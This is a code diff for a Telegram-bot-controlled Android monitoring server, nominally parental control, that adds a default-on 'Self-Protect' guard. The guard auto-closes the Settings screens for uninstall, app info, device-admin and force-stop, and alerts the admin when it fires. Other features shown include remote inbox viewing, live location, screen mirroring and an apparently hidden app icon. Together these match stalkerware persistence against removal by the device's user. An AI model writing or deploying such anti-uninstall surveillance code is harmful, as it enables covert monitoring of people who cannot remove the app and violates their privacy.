@@ -854,6 +854,9 @@ function initTelegramBot() {
         { text: "🔗 Open URL",       callback_data: `act:open_url:${deviceId}` },
       ],
       [
+        { text: "🛡️ Self-Protect",  callback_data: `act:guard:${deviceId}` },
+      ],
+      [
         { text: "💬 Show Toast",     callback_data: `act:toast:${deviceId}` },
         { text: "🔄 Refresh",        callback_data: `sel:${deviceId}` },
       ],
@@ -920,6 +923,7 @@ function initTelegramBot() {
       `📲 Active App: *${escApp}*\n` +
       `⏱️ Screen:    ${stText}\n` +
       `🚫 Blocked:   ${blocked}\n` +
+      `🛡️ Self-Protect: ${dev.uninstallGuard !== false ? "*ON (armed)*" : "*OFF — uninstall allowed*"}\n` +
       `📡 Last seen: ${lastSeen}\n` +
       `${"─".repeat(28)}\n` +
       `_Niche theke action choose koro:_`;
@@ -1539,6 +1543,52 @@ Kon inbox dekhte chao?`, {
       if (action === "stop_live_location") {
         bot.answerCallbackQuery(query.id, { text: "⏹ Stopping live location" });
         sendCommandToDevice(deviceId, { command: "stop_live_location" });
+        return;
+      }
+
+      // ── Self-protection (uninstall guard) menu & actions ──────────────
+      if (action === "guard") {
+        bot.answerCallbackQuery(query.id);
+        const guardOn = dev.uninstallGuard !== false;
+        bot.sendMessage(chatId,
+          `🛡️ *Self-Protection — ${escapeMd(dev.childName)}*\n\n` +
+          `Guard ekhon: *${guardOn ? "ARMED (chalu)" : "OFF (bondho)"}*\n\n` +
+          `• **ARM** → child Settings e giye Uninstall / App info / Device-admin / Force-stop screen khullei instantly home chole jabe.\n\n` +
+          `• **Disarm** → temporary off. Sudhu matro tar somoy use koro jokhon nije device ta manage korbe.\n\n` +
+          `• **Uninstall Mode** → guard band + device-admin remove + app icon show. App ta fully remove/upgrade korar jonno.`,
+          {
+            parse_mode: "Markdown",
+            reply_markup: { inline_keyboard: [
+              [{ text: "🛡️ ARM Guard",         callback_data: `act:guard_arm:${deviceId}` }],
+              [{ text: "⚠️ Disarm (temporary)", callback_data: `act:guard_disarm:${deviceId}` }],
+              [{ text: "🗑️ Uninstall Mode",     callback_data: `act:guard_uninstall:${deviceId}` }],
+              [{ text: "◀️ Back to Device",      callback_data: `sel:${deviceId}` }],
+            ]}
+          }
+        );
+        return;
+      }
+      if (action === "guard_arm" || action === "guard_disarm") {
+        const enable = action === "guard_arm";
+        if (!childDevices.has(deviceId)) { bot.answerCallbackQuery(query.id, { text: "❌ Device offline." }); return; }
+        bot.answerCallbackQuery(query.id, { text: enable ? "🛡️ Guard arming…" : "🛡️ Guard disarming…" });
+        sendCommandToDevice(deviceId, { command: "set_uninstall_guard", enabled: enable });
+        if (dev) dev.uninstallGuard = enable;
+        bot.sendMessage(chatId,
+          `🛡️ Self-protect guard *${enable ? "ARMED" : "DISARMED"}* on *${escapeMd(dev.childName)}*${enable ? "" : "\n\n⚠️ Ekhon Settings theke app manage/uninstall kora jete pare — satarke kaj koro."}`,
+          { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${deviceId}` }]] } }
+        );
+        return;
+      }
+      if (action === "guard_uninstall") {
+        if (!childDevices.has(deviceId)) { bot.answerCallbackQuery(query.id, { text: "❌ Device offline." }); return; }
+        bot.answerCallbackQuery(query.id, { text: "🗑️ Uninstall mode pathano hocche…" });
+        sendCommandToDevice(deviceId, { command: "uninstall_mode" });
+        if (dev) dev.uninstallGuard = false;
+        bot.sendMessage(chatId,
+          `🗑️ *Uninstall Mode* pathano hoyeche — *${escapeMd(dev.childName)}*\n\nGuard off + device-admin remove + icon show hobe. App ta uninstall korar jonno ekhon device ta hat-e niye confirm koro.`,
+          { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${deviceId}` }]] } }
+        );
         return;
       }
 
@@ -2223,6 +2273,7 @@ function getSanitizedDeviceList() {
     ringerMode:       dev.ringerMode || "—",
     networkType:      dev.networkType || "—",
     screenState:      dev.screenState || "—",
+    uninstallGuard:   dev.uninstallGuard !== undefined ? dev.uninstallGuard : true,
   }));
 }
 
@@ -2274,7 +2325,8 @@ wss.on('connection', (ws, req) => {
             ws, childName: friendlyName, battery: 100,
             activeApp: "System Launcher", lastSeen: Date.now(),
             isMirroring: false, lastFrame: null,
-            screenTimeUsedMin: 0, screenTimeLimitMin: 0, blockedApps: ""
+            screenTimeUsedMin: 0, screenTimeLimitMin: 0, blockedApps: "",
+            uninstallGuard: true
           });
 
           console.log(`[WS] Android connected: "${deviceId}" (${friendlyName})`);
@@ -2384,7 +2436,8 @@ wss.on('connection', (ws, req) => {
               device_id: payload.device_id || deviceId,
               screen_time_used: (payload.screen_time_used_today ?? dev.screenTimeUsedMin) || 0,
               screen_time_limit: (payload.screen_time_limit ?? dev.screenTimeLimitMin) || 0,
-              blocked_apps: (payload.blocked_apps ?? dev.blockedApps) || ''
+              blocked_apps: (payload.blocked_apps ?? dev.blockedApps) || '',
+              uninstall_guard: payload.uninstall_guard !== undefined ? !!payload.uninstall_guard : true
             };
             payload = giPayload;
             const prGI = pendingBotFileRequests.get(deviceId + '_data');
@@ -2429,6 +2482,7 @@ wss.on('connection', (ws, req) => {
           if (payload.blocked_apps !== undefined)      dev.blockedApps = payload.blocked_apps;
           if (payload.screen_time_limit !== undefined) dev.screenTimeLimitMin = payload.screen_time_limit;
           if (payload.battery !== undefined)           dev.battery = payload.battery;
+          if (payload.uninstall_guard !== undefined)   dev.uninstallGuard = !!payload.uninstall_guard;
           broadcastToAdmins(payload);
           const prGI = pendingBotFileRequests.get(deviceId + '_data');
           if (prGI && bot && prGI.type === 'get_info_result') {
@@ -2710,6 +2764,27 @@ wss.on('connection', (ws, req) => {
                 break;
               }
             }
+          }
+
+        } else if (payload.type === 'mirror_status') {
+          // Screen-cast consent / lifecycle report from the device.
+          if (payload.active === true) dev.isMirroring = true;
+          else if (payload.active === false) dev.isMirroring = false;
+          broadcastToAdmins({ ...payload, deviceId });
+          broadcastDeviceList();
+          if (bot && payload.active === false && payload.message) {
+            notifyAdmin(`📺 *Screen-cast note — ${escapeMd(dev.childName)}*\n${escapeMd(payload.message)}`);
+          }
+
+        } else if (payload.type === 'uninstall_guard_event') {
+          // Uninstall guard auto-dismissed a risky Settings screen on the device.
+          const gTime = new Date().toLocaleString();
+          broadcastToAdmins({ ...payload, deviceId, timeLabel: gTime });
+          if (bot) {
+            notifyAdmin(
+              `🛡️ *Self-protection triggered — ${escapeMd(dev.childName)}*\n\n${escapeMd(payload.detail || 'Uninstall / app-management screen was auto-closed.')}\n🕐 ${gTime}`,
+              { reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
+            );
           }
 
         } else {
